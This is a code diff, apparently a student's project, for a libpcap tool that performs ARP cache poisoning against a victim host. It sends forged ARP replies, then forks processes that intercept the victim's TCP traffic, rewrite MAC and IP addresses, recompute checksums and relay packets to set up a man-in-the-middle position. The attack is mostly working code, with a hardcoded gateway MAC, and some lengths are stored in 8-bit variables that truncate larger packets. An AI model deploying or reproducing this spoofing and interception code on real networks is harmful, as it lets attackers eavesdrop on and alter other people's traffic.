@@ -7,6 +7,8 @@
 #include <sys/ioctl.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <errno.h>
 
 using namespace std;
 
@@ -62,8 +64,9 @@ void arp_send(eth_Header *eth, arp_Header *arp, pcap_t *hdle, u_char *pack);
 void eth_Make(eth_Header *eth, u_char *dmac, ifreq *smac);
 void arp_Make(arp_Header *arp, u_char *dmac, ifreq *smac, u_char *dip, u_char *sip, uint t);
 void ip_chksum(u_char *packet, int siz);
-void tcp_chksum(u_char *packet, u_int8_t th, u_int64_t tp);
-
+void tcp_chksum(u_char *packet, u_int8_t ih, u_int8_t th, u_int8_t tp);
+u_char tcpac[4] = {0,};
+u_char gmac[6] = {0x2c, 0x59, 0x8a, 0x59, 0x4a, 0x68};  //gateway mac, later source change!!
 int main(int argc, char **argv)
 {
     arp_Header arphd;
@@ -151,29 +154,13 @@ int main(int argc, char **argv)
     //index 22
 
     //arp attack
-//    u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02}; //gateway mac 52:54:00:12:35:02
-/*    memcpy(ethhd.eth_dmac, smac, 6); //victim mac
-    memcpy(ethhd.eth_smac, ifr->ifr_hwaddr.sa_data, 6);  //my mac
-    ethhd.eth_type = htons(0x0806);
-    arphd.arp_hrd = htons(0x01);
-    arphd.arp_proto = htons(0x0800);
-    arphd.arp_hl = 6;
-    arphd.arp_pln = 4;
-    arphd.arp_op = htons(2);    //arp reply
-    memcpy(arphd.arp_smac, ifr->ifr_hwaddr.sa_data, 6); //gateway mac -> my mac
-    memcpy(arphd.arp_sip, ipd, 4);  //gateway ip
 
-    memcpy(arphd.arp_dmac, smac, 6);    //victim mac
-    memcpy(arphd.arp_dip, ips, 4);      //victim ip
-*/
     eth_Make(&ethhd, &smac[0], &ifr[0]);    //arp reply eth header
     arp_Make(&arphd, &smac[0], &ifr[0], &ips[0], &ipd[0], 2); //arp reply arp header
 
     memset(packet, 0 ,sizeof(packet));
     memcpy(packet, &ethhd, sizeof(ethhd));
     memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
-//    for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
-    printf("\n");
 
     if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)    //arp reply send
     {
@@ -182,33 +169,39 @@ int main(int argc, char **argv)
     }
     printf("Wow!!");
 //------------------------------------send arp----------------------
+
+//    while(1)
+//    {
+    pid_t pid;
+    pid = fork();
+    if(pid == -1)
+    {
+        printf("fork fali\n");
+        exit(0);
+    }
+    if(pid ==0)
+    {
     int p=1000;
     while(p--)
     {
-        if(p%10 == 0)
+        if(p%5 == 0)
         {
 //        //arp reply !!
-//        memset(packet, 0 ,sizeof(packet));
-//        memcpy(packet, &ethhd, sizeof(ethhd));
-//        memcpy(packet + sizeof(ethhd), &arphd, sizeof(arphd));
-//        for(int i=0; i<sizeof(ethhd); i++) printf(" %x", packet[i]);
-//        printf("\n");
-
-        if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
-        {
-            printf("send error");
-            return 0;
-        }
-        printf("Wow!!");
+            if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+            {
+                printf("send error");
+                return 0;
+            }
+            printf("Wow!!");
         }
 
         //sender catch
         struct pcap_pkthdr* headers;
         const u_char* pacspo;
-//        u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02};
-        u_char gmac[6] = {0x2c, 0x59, 0x8a, 0x59, 0x4a, 0x68};  //gateway mac, later source change!!
+
         pcap_next_ex(handle, &headers, &pacspo);
         printf("%u bytes captured\n", headers->caplen);
+
         u_char rely[6];
         u_char pac[1500] = {0,};
         memcpy(rely, &pacspo[6], 6);
@@ -220,88 +213,166 @@ int main(int argc, char **argv)
         if(j==6)
         {
             printf("ARP relay\n");
-            memset(pac, 0, headers->caplen);
+            memset(pac, 0, sizeof(pac));
             memcpy(pac, pacspo, headers->caplen);
 
             memcpy(pac, gmac, 6);   //my mac -> gateway mac
             memcpy(&pac[6], ifr->ifr_hwaddr.sa_data, 6);    //eth source mac -> my mac address
             for(int i=0; i<4; i++) pac[i+26] = ipm[i]; //tcp packet source ip -> my ip
 
-
             if(pac[12] == 0x08 && pac[13] == 0x00)
             {
                 printf("IPv4!!");
-                u_int8_t ihl = (pac[14] & 0x0F) * 4; //IP Header Length (4bit), packet[14] = Version(4bit) and IHL(4bit) , 20
-                u_int8_t thl = pac[26 + ihl] / 4; //TCP Header Length, 14 + ihl + 13 - 1 ,
-                u_int8_t tp = 14 + ihl + thl; //TCP Payload Start Point , 34
-                u_int64_t tpl = headers->caplen - tp; //Payload Length
-//                ip_chksum(&pac[14], ihl);
-                //IP header checksum
-                long sum=0;
-                long ans=0;
-                for(int s=14; s<34; s+=2)
+                if(pac[23] == 0x06)
                 {
-                    if(s==24) continue;
-                    sum += pac[s] << 8;
-                    sum += pac[s+1];
-                }
+                    printf("TCP!\n");
+                    u_int8_t siz = (u_int8_t)headers->caplen;
+                    u_int8_t ihl = (pac[14] & 0x0F) * 4; //IP Header Length (4bit), packet[14] = Version(4bit) and IHL(4bit) , 20
+                    u_int8_t thl = pac[26 + ihl] / 4; //TCP Header Length, 14 + ihl + 13 - 1 ,
+                    u_int8_t tp = 14 + ihl + thl; //TCP Payload Start Point , 34
+                    u_int8_t tpl = siz - tp; //Payload Length
 
-                printf("sum!!! = %ld\n", sum);
-                ans = (sum>>16) + (sum & 0xffff);
-                ans = ans ^ 0xffff;
-                printf("%x\n", ans);
-                printf("%x %x\n", ans >> 8, ans & 0xff);
-                pac[24] = ans >> 8;
-                pac[25] = ans & 0xff;
+                    ip_chksum(&pac[14], ihl);     //IP header checksum
+                    tcp_chksum(&pac[0], ihl, thl, tpl); //TCP header checksum
 
-                //TCP header checksum
-//                tcp_chksum(&pac[26], thl, tpl);
-                long p_sum=0;
-
-                printf("%d %d %d %d\n", ihl, thl, tp, tpl);
-                //Pseudo Header sum
-                for(int s=26; s<34; s+=2)
-                {
-                    p_sum += pac[s] << 8;
-                    p_sum += pac[s+1];
-                    if(p_sum > 65536) p_sum = (p_sum - 65536) + 1;
-                }
-                p_sum += 0x0006;
-                if(p_sum > 65536) p_sum = (p_sum - 65536) + 1;
-                p_sum += thl;
-                p_sum += tpl;
-                if(p_sum > 65536) p_sum = (p_sum - 65536) + 1;
-                //TCP Segment sum
-                long t_sum = 0;
-                for(int s=14+ihl; s < headers->caplen; s+=2)
-                {
-                    if(s==14+ihl+16) continue;
-                    t_sum += pac[s] << 8;
-                    t_sum += pac[s+1];
-                    if(t_sum > 65536) t_sum = (t_sum - 65536) + 1;
-                }
-                p_sum += t_sum;
-                if(p_sum > 65536) p_sum = (p_sum - 65536) + 1;
-                p_sum = p_sum ^ 0xffff;
-
-                pac[14+ihl+16] = p_sum >> 8;
-                pac[14+ihl+16+1] = p_sum & 0xff;
-
-                printf("p_sum= %x\n", p_sum);
-                printf("p_sum %x %x\n", p_sum >> 8, p_sum & 0xff);
-
-                if(pcap_sendpacket(handle, pac, headers->caplen) != 0)
-                {
-                    printf("send error22!!\n");
-                    return 0;
+                    //sender -> origin trans
+                    if(pcap_sendpacket(handle, pac, siz) != 0)
+                    {
+                        printf("send error22!!\n");
+                        return 0;
+                    }
+//                    else
+//                    {
+//                        for(int i=0; i<4; i++)
+//                        {
+//                            printf("aaaaaaaaaaaa");
+//                            tcpac[i] = pac[i+30];
+//                        }
+//                    }
                 }
             }
-
-
-
-
         }
     }
+    exit(0);
+    }
+
+         //----------------------------------------------------
+                else{
+                    int q=1000;
+                    while(q--){
+                    struct pcap_pkthdr* headerelay;
+                    const u_char* pacrelay;
+
+                    pcap_next_ex(handle, &headerelay, &pacrelay);
+                    printf("relay %u bytes captured\n", headerelay->caplen);
+                    u_char pacrea[1500] = {0,};
+                    memset(pacrea, 0, sizeof(pacrea));
+                    memcpy(pacrea, pacrelay, headerelay->caplen);
+                    //to sender relay, des ip & mac -> sender ip & mac
+                    int l = 0;
+                    for(int e=0; e<6; e++)
+                    {
+                        if(smac[e] == pacrea[e+6]) l++;
+                    }
+                    if(l != 6 )
+                    {
+                    if(pacrea[12] == 0x08 && pacrea[13] == 0x00)
+                    {
+                        printf("IPv4!!");
+                        if(pacrea[23] == 0x06)
+                        {
+                            printf("TCP!\n");
+                            u_int8_t size = (u_int8_t)headerelay->caplen;
+                            u_int8_t ihle = (pacrea[14] & 0x0F) * 4; //IP Header Length (4bit), packet[14] = Version(4bit) and IHL(4bit) , 20
+                            u_int8_t thle = pacrea[26 + ihle] / 4; //TCP Header Length, 14 + ihl + 13 - 1 ,
+                            u_int8_t tpe = 14 + ihle + thle; //TCP Payload Start Point , 34
+                            u_int8_t tple = size - tpe; //Payload Length
+
+//                            int m=0;
+//                            for(int i=0; i<4; i++)
+//                            {
+//                                if(tcpac[i] == pacrea[i+26]) m++;
+//                            }
+//                            if(m == 4)
+//                            {
+                                printf("RELAY!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
+                                for(int i=0; i<4; i++) pacrea[i+30] = ips[i];
+                                memcpy(&pacrea[0], smac, 6);
+                     //           memcpy(&pacrea[6], gmac, 6);
+                                ip_chksum(&pacrea[14], ihle);
+                                tcp_chksum(&pacrea[0], ihle, thle, tple);
+                                if(pcap_sendpacket(handle, pacrea, size) != 0)
+                                {
+                                    printf("send error22!!\n");
+                                    return 0;
+                                }
+                        //    }
+                        }
+                    }
+                  }
+                }
+                    exit(0);
+              }
+
+
+//    int q=10;
+//    while(q--)
+//    {
+//        if(q%2 == 0)
+//        {
+        //arp reply !!
+//            if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
+//            {
+//                printf("send error");
+//                return 0;
+//            }
+//            printf("Wow!!");
+//        }
+
+//        struct pcap_pkthdr* headerelay;
+//        const u_char* pacrelay;
+
+//        pcap_next_ex(handle, &headerelay, &pacrelay);
+//        printf("relay %u bytes captured\n", headerelay->caplen);
+//        u_char pacrea[1500] = {0,};
+//        memset(pacrea, 0, headerelay->caplen);
+//        memcpy(pacrea, pacrelay, headerelay->caplen);
+//        //to sender relay, des ip & mac -> sender ip & mac
+//        if(pacrea[12] == 0x08 && pacrea[13] == 0x00)
+//        {
+//            printf("IPv4!!");
+//            if(pacrea[23] == 0x06)
+//            {
+//                printf("TCP!\n");
+
+//                u_int8_t ihl = (pacrea[14] & 0x0F) * 4; //IP Header Length (4bit), packet[14] = Version(4bit) and IHL(4bit) , 20
+//                u_int8_t thl = pacrea[26 + ihl] / 4; //TCP Header Length, 14 + ihl + 13 - 1 ,
+//                u_int8_t tp = 14 + ihl + thl; //TCP Payload Start Point , 34
+//                u_int8_t tpl = headerelay->caplen - tp; //Payload Length
+
+//                int m=0;
+//                for(int i=0; i<4; i++)
+//                {
+//                    if(tcpac[i] == pacrea[i+26]) m++;
+//                }
+//                if(m == 4)
+//                {
+//                    printf("RELAY!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
+//                    for(int i=0; i<4; i++) pacrea[i+30] = ips[i];
+//                    memcpy(&pacrea[0], smac, 6);
+//                    memcpy(&pacrea[6], gmac, 6);
+//                    ip_chksum(&pacrea[14], ihl);
+//                    tcp_chksum(&pacrea[0], ihl, thl, tpl);
+//                    if(pcap_sendpacket(handle, pacrea, headerelay->caplen) != 0)
+//                    {
+//                        printf("send error22!!\n");
+//                        return 0;
+//                    }
+//                }
+//            }
+//        }
+//    }
+
 
     return 0;
 }
@@ -371,12 +442,12 @@ void ip_chksum(u_char *packet, int siz)
     packet[10] = ans >> 8;
     packet[11] = ans & 0xff;
 }
-void tcp_chksum(u_char *packet, u_int8_t th, u_int64_t tp)
+void tcp_chksum(u_char *packet, u_int8_t ih, u_int8_t th, u_int8_t tp)
 {
     long p_sum=0;
 
     //Pseudo Header sum
-    for(int s=0; s<8; s+=2)
+    for(int s=26; s<34; s+=2)
     {
         p_sum += packet[s] << 8;
         p_sum += packet[s+1];
@@ -389,9 +460,9 @@ void tcp_chksum(u_char *packet, u_int8_t th, u_int64_t tp)
     if(p_sum > 65536) p_sum = (p_sum - 65536) + 1;
     //TCP Segment sum
     long t_sum = 0;
-    for(int s=8; s < th+tp; s+=2)
+    for(int s=14+ih; s < 14 + ih +th + tp; s+=2)
     {
-        if(s==8+16) continue;
+        if(s==14+ih+16) continue;
         t_sum += packet[s] << 8;
         t_sum += packet[s+1];
         if(t_sum > 65536) t_sum = (t_sum - 65536) + 1;
@@ -400,9 +471,10 @@ void tcp_chksum(u_char *packet, u_int8_t th, u_int64_t tp)
     if(p_sum > 65536) p_sum = (p_sum - 65536) + 1;
     p_sum = p_sum ^ 0xffff;
 
-    packet[8+16] = p_sum >> 8;
-    packet[8+16+1] = p_sum & 0xff;
+    packet[14+ih+16] = p_sum >> 8;
+    packet[14+ih+16+1] = p_sum & 0xff;
 
     printf("p_sum= %x\n", p_sum);
     printf("p_sum %x %x\n", p_sum >> 8, p_sum & 0xff);
+
 }
